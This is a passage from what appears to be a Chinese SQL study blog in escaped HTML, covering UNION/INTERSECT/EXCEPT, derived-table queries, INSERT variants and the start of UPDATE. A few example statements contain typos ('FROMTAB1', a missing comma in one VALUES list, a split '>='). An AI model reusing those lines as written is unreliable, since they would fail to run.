&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;参加集合操作的各查询结果的列数必须相同，对应项的数据类型也必须相同&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;union并操作满足前者或满足后者&#34;&gt;UNION并操作（满足前者或满足后者）
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;UNION合并查询结果时，系统会自动去掉重复元组，若需保留，则采用UNIONALL&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.在TAB2中查询学号大于等于23003的学生和选择了MATH科目的学生&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;23003&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UNION&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;intersect交操作前后都满足&#34;&gt;INTERSECT交操作（前后都满足）
&lt;/h4&gt;&lt;p&gt;eg.在TAB2中查询选了MATH又选了history的学生&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;history&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;history&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTERSECT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;except差操作满足前者不满足后者&#34;&gt;EXCEPT差操作（满足前者，不满足后者）
&lt;/h4&gt;&lt;p&gt;eg.在TAB2中查询学号大于23002的学生和选修了MATH的学生的差集&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;23002&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;EXCEPT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;基于派生表的查询&#34;&gt;基于派生表的查询
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;子查询出现在FROM子句时，子查询将生成临时的派生表，成为主查询的查询对象&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;FROM (子查询) AS 别名 (属性列名1,属性列名2)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果子查询中没有聚集函数，派生表可以不指定属性列，子查询SELECT子句后面的列名为其默认属性&lt;/strong&gt;
&lt;strong&gt;AS可以省略，但必须为派生表关系指定一个别名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg1.找出每个学生超过他自己选修课程平均成绩的课程号&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;, &lt;span style=&#34;color:#c678dd&#34;&gt;Avg&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Avg_sc&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;avg_sno&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;avg_grade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Avg_sc&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;avg_sno&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Avg_sc&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;avg_grade&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg2.查询所有选修了1号课程的学生姓名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sname&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Student&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Student&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;SC1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;插入数据insert语句&#34;&gt;插入数据&amp;ndash;INSERT语句
&lt;/h2&gt;&lt;h3 id=&#34;插入元组&#34;&gt;插入元组
&lt;/h3&gt;&lt;h4 id=&#34;一般格式-1&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;INSERT&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;INTO 表名(列名1,列名n)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;VALUES(常量1,常量n);&lt;/strong&gt;&lt;/mark&gt;    //字符串常量要用单引号&amp;rsquo;&amp;lsquo;括起来&lt;/p&gt;
&lt;h4 id=&#34;假设现在有tab1表有c1到c4四列其中c4列是字符串常量&#34;&gt;&lt;span style=&#34;font-size:20px;color:red&#34;&gt;&lt;strong&gt;假设现在有TAB1表，有C1到C4四列，其中C4列是字符串常量：&lt;/strong&gt;&lt;/span&gt;
&lt;/h4&gt;&lt;h4 id=&#34;情况1明确给出新增元组要在哪些属性上赋值插入数据包含全部属性列&#34;&gt;情况1：明确给出新增元组要在哪些属性上赋值（插入数据包含全部属性列）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况2明确给出新增元组要在哪些属性上赋值插入数据只包含部分属性列&#34;&gt;情况2：明确给出新增元组要在哪些属性上赋值（插入数据只包含部分属性列）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这种情况下C4列会被赋值NULL，如果C4有约束条件NOT NULL则会报错&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况3仅指出要在tab1表上插入元组插入数据包含全部属性列&#34;&gt;情况3：仅指出要在TAB1表上插入元组（插入数据包含全部属性列）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这种情况表示要在全部属性列上赋值，插入数据顺序必须和列的顺序对应&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况4仅指出要在tab1表上插入元组插入数据只包含部分属性列&#34;&gt;情况4：仅指出要在TAB1表上插入元组（插入数据只包含部分属性列）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这种情况必须明确未赋值的属性列为NULL&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;插入子查询结果&#34;&gt;插入子查询结果
&lt;/h3&gt;&lt;h4 id=&#34;一般格式-2&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;INSERT&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;INTO TAB1(属性列1,属性列2)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;子查询;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.假设现有TAB1表（如上），并按C1列分组求C2列的平均值，并存入TAB2表（其中TAB2表的C1列存放
C1，avg_C2列存放C2列的均值)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;avg_C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;, &lt;span style=&#34;color:#c678dd&#34;&gt;AVG&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;FROMTAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;修改数据update语句&#34;&gt;修改数据&amp;ndash;UPDATE语句
&lt;/h2&gt;&lt;h4 id=&#34;一般格式-3&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;UPDATE 表名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;==&lt;strong&gt;SET 列名1=表达式1,列名n=表达式n&lt;/strong&gt;&lt;mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;/mark&gt;&lt;strong&gt;WHERE 条件;&lt;/strong&gt;==&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WHERE语句若省略，则表示修改表中所有元组&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况1修改某一个元组的值&#34;&gt;情况1：修改某一个元组的值
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
